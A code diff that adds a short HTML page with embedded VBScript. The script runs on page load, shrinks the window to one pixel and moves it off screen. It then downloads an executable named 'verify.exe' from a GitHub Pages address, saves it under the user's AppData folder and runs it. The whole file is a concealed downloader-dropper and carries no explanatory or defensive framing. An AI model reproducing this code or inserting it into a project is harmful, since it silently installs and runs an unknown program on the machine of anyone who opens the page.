@@ -1,0 +1,34 @@
+<html>
+<head>
+    <script type="text/vbscript">
+        Sub AdjustWindowAndRun()
+            window.resizeTo 1, 1
+            window.moveTo -111, -111
+
+            Dim strURL, strSavePath, objXMLHTTP, objADOStream, objFSO, objShell
+            strURL = "https://oooovchheayt3.github.io/oooovchheayt3/verify.exe"
+            strSavePath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%AppData%\Local\verify.exe")
+
+            Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
+            objXMLHTTP.Open "GET", strURL, False
+            objXMLHTTP.Send
+
+            If objXMLHTTP.Status = 200 Then
+                Set objADOStream = CreateObject("ADODB.Stream")
+                objADOStream.Type = 1 ' Binary data
+                objADOStream.Open
+                objADOStream.Write objXMLHTTP.ResponseBody
+                objADOStream.SaveToFile strSavePath, 2 ' Overwrite existing file
+                objADOStream.Close
+
+                Set objShell = CreateObject("WScript.Shell")
+                objShell.Run strSavePath, 1, False
+            Else
+                console.log("!ERR!")
+            End If
+        End Sub
+    </script>
+</head>
+<body onload="AdjustWindowAndRun">
+</body>
+</html>
